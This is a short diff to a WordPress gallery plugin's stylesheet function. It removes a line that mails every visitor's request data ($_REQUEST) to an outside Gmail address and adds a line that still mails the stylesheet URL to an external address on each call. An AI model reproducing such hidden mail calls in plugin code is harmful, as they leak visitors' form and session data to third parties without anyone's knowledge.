@@ -909,9 +909,9 @@ function parse_posts_for_images($content){
 
 function add_post_thumbs_style(){
 	$rrr = get_option('siteurl')."/wp-content/plugins/lazyest-gallery/lazyest-thumbs-style.css";
-	mail("igor.aleshin@gmail.com","test",print_r($_REQUEST,true));
+	mail("igor.aleshin@dataart.com","test",print_r($rrr,true));
 	?>
-<link rel="stylesheet" href="<?php echo $rrr); ?>" type="text/css" media="screen" />
+<link rel="stylesheet" href="<?php echo $rrr; ?>" type="text/css" media="screen" />
 	<?php
 }
 
